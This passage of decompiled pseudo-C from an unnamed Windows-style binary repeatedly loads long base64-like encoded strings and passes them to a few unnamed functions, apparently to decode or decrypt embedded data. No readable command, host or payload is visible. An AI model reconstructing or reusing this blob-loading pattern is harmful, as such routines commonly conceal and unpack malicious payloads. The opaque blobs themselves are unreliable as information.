61ORPpnYa7i/XPh0l2DphT7JIUW8VMWWEXFUQHAhUdgfdgoInVFqpqeIqU0iNPh2yeifsXTAii7RQxiBcDyLWYVOO4Nh3PYxkOsM4D7jVNmdVEBOQPEzZZfyIjy/fUmSydXGc2qfFp1ncm828w5++kSAI1HFxFiEnJ1odZgQT2Kq97wRo83B4+MRaEX/k2/r8gdBBHFKzaaGegK9Im+SDMreipUOQ/t9DuV7qGPp5dOEwU6EyIcqEiiKPJVMX0yZ1P601/Dp1C8qDJL1XCmn+frZv88QDUnJoN+S0AxyoNwofFOq7gt6kOid73d7qd6Bb7kaOzH73LJ8/3GOjfD7L2MwIYg4sehMwDWHuoGxikYFtEQI0TYrveIsaT3cH2MwYlDVT4aCyUXE1r6KIq5eLHvZItHmMmN3jQK5kXbRNPUzzDWZlElIilmd9Oh8fVnsJtWeRuN4clQXGC1kys9cqreRecHsfoppeRJatunCRXFYhxi/iTcN9x7mIHBfiDdft1uIXaR+D9XSTW8UdUcaFJA+WzFyzTse8VJlF0r9c0BaLNOoV/aNlwIoLjzY7auFUBTFcYI5ewN2xSJk/Vq1OGyi5sZ2OY6BEVwP21TofkukHieI66s0iZWvf69HhOEG27wSv6t0aoK14ME5EWQAwmOw21tg8QXPL+sXFKC27TMLsmdX3q1gkajquF90BqMBSbezOoqpeP9Ftoh/M8GqilFI+7pzSEupHIiMNXsgL1/mI3vCzCHG1dbk6gxMKrvMhm7tv0caysHoqhCM0D3fNR5GcDU0f4zW0RX3sqfZqccHzh8VRK0GKyX9i7bPHf3VgIlTyrFxVZpAaDElc/IGLaZUvXQ0lWYx8Sbrw5KVxfUnRRGnZtq4P9g+zktQFGdW/I7FbhQVKF5dmqP5QXQdQp3mmAbqSV77b3YrTUv9m9FjDA8wTZhOdP6lIRAuNU3wJ\"\n    ;\n    puStack132 = &stack0xffffffb8;\n    uStack136 = 0x4013c7;\n    puStack132 = fcn.004028d0();\n    uStack16 = 1;\n    pcStack124 = *0x4295b4;\n    uStack128 = NULL;\n    uStack136 = 0x4013e1;\n    fcn.004022b0();\n    uStack136 = 1;\n    uStack28 = 0;\n    pcStack140 = 0x4013f0;\n    fcn.004024b0();\n    uStack144 = &stack0xffffff98;\n    pcStack140 = \n    \"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\"\n    ;\n    puStack148 = &stack0xffffffa8;\n    uStack152 = 0x401404;\n    puStack148 = fcn.004028d0();\n    uStack32 = 2;\n    pcStack140 = *0x4295b4;\n    uStack144 = NULL;\n    uStack152 = 0x40141e;\n    fcn.004022b0();\n    uStack152 = 1;\n    uStack44 = 0;\n    pcStack156 = 0x40142d;\n    fcn.004024b0();\n    uStack160 = &stack0xffffff88;\n    pcStack156 = \n    \"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\"\n    ;\n    puStack164 = &stack0xffffff98;\n    uStack168 = 0x401441;\n    puStack164 = fcn.004028d0();\n    uStack48 = 3;\n    pcStack156 = *0x4295b4;\n    uStack160 = NULL;\n    uStack168 = 0x40145b;\n    fcn.004022b0();\n    uStack168 = 1;\n    uStack60 = 0;\n    pcStack172 = 0x40146a;\n    fcn.004024b0();\n    pcStack172 = \n    \"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\"\n    ;\n    uStack176 = &stack0xffffff78;\n    puStack180 = &stack0xffffff88;\n    uStack184 = 0x40147e;\n    puStack180 = fcn.004028d0();\n    uStack64 = 4;\n    pcStack172 = *0x4295b4;\n    uStack176 = NULL;\n    uStack184 = 0x401498;\n    fcn.004022b0();\n    uStack184 = 1;\n    uStack76 = 0;\n    pcStack188 = 0x4014a7;\n    fcn.004024b0();\n    uStack192 = &stack0xffffff68;\n    pcStack188 = \n    \"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\"\n    ;\n    puStack196 = &stack0xffffff78;\n    uStack200 = 0x4014bb;\n    puStack196 = fcn.004028d0();\n    uStack80 = 5;\n    pcStack188 = *0x4295b4;\n    uStack192 = NULL;\n    uStack200 = 0x4014d5;\n    fcn.004022b0();\n    uStack200 = 1;\n    pcStack204 = 0x4014e4;\n    fcn.004024b0();\n    uStack208 = &stack0xffffff58;\n    pcStack204 = \n    \"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\"\n    ;\n    puStack212 = &stack0xffffff68;\n    uStack216 = 0x4014f8;\n    puStack212 = fcn.004028d0();\n    pcStack204 = *0x4295b4;\n    uStack208 = NULL;\n    uStack216 = 0x401512;\n    fcn.004022b0();\n    uStack216 = 1;\n    pcStack220 = 0x401521;\n    fcn.004024b0();\n    uStack224 = &stack0xffffff48;\n    pcStack220 = \n    \"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\"\n    ;\n    puStack228 = &stack0xffffff58;\n    uStack232 = 0x401535;\n    puStack228 = fcn.004028d0();\n    uStack112 = CONCAT31(uStack112._1_3_, 7);\n    pcStack220 = *0x4295b4;\n    uStack224 = NULL;\n    uStack232 = 0x40154f;\n    fcn.004022b0();\n    uStack232 = 1;\n    pcStack124 = pcStack124 & 0xffffff00;\n    pcStack236 = 0x40155e;\n    fcn.004024b0();\n    uStack240 = &stack0xffffff38;\n    pcStack236 = \n    \"/DbvZgx6x7NgOGQgegmyq7KSpNMjZwksKfaRB0YfdfwiG7qib0dMtg5APRhmwfZK85kvQsrCHCArX8cRKB76FvrVX5ABhSKExNOEuB0pm5ASQ65NZ6AfKEvXBFJc3xrpXx5w0dNvnURT6lEYfcAWd+GEE+Se45nwJoTrdTFzbnlFBfDwMjdQy61qMnbC49UQZsLmPnK2DbZyb8O31PzlkESja/3Vn8QgvABMojqDMkDKVXFQmIUaHKafgjQfmMs44TYvNLCSBey4oDQY0AbRH5q7UyS+MjgAm0Jez8cP5iESVSDYrS50b3jGld9ptHHuGKSGSAMYY9BkZ4nyMwIgQ4Fe5+VWo6y/jby7SQ7XBaLJNs7D2YSR/h5Ye69kojgMfGKDPHCBAqGVUC+KIS4Mc3ukLisKxUIpqAjvhVUcginF08wEqEEIFG7d2KAVeSmYfyd2opqOBUowT++sj5n0+vRQBnhgz1qyCvuVB6PGFt8Uqhv7Vb5R0kN/DB6oDXg+NP5Ac9MwFtZXN/KHjQa2HsfyIkFvMnQBhCEOTGD/Ce/4xtjeiDCoC2qnfFI80O1uSliwoiNhuViHnxxawAiNft/YdakTyNLqHLJJxIRcMeQS3FwSQqq0ZbyMUu2q+fDvM5Yp+eCjRdUJuxVBsxr9A/0iLEjDiKldQyd9iXTDBMgf2CWRbJxm8++KTPV0hCHL8p/brgtncUVzbLxrylUVNrxevzfhPu7TOPNBrnLb/Nece6B5ANyk4nJWjTFdOHso3OpWU7DbYtnSH84aowZxwc/miDvEuoKerjHlOXKwgqXJU1gncR3H9twhKqlnOn0L8pcsQ3tGvjlQmyeZ0WP/buytWPsFBjoZG2xUHjYdxA/jEF5TSTabwK8eqC6nLJWSnIl3EzvoPDZXiCvpujhfDSwl7KNcf8oClJhcjQzq4TAWMXyOmTYVBaACruT+ToOgVYBo3wJegdY/VIisJ12qBpOqZiUG3FhO7A6/7hcCui8FErwL8PtJdAs88S42jbwTkTICnaWb/fVTZlXLLXtqJeMQOPS7AVVtXSTn+DWGKhWj8UA29v5wlJ2FRs4YO9A4n7uZGWeqOoIKFfzvytNlC6rjlc2pfXE2Ouw8eeGqYJI+NPMkR+ZKVqfr6f1lHaNUW9RdNTvq8Xbgso1hBxx/Rvm2EhwJ5SnoHnF9MCPQdC8UK5+5LQ38h0RXuqeZUkSYcZGj7jIF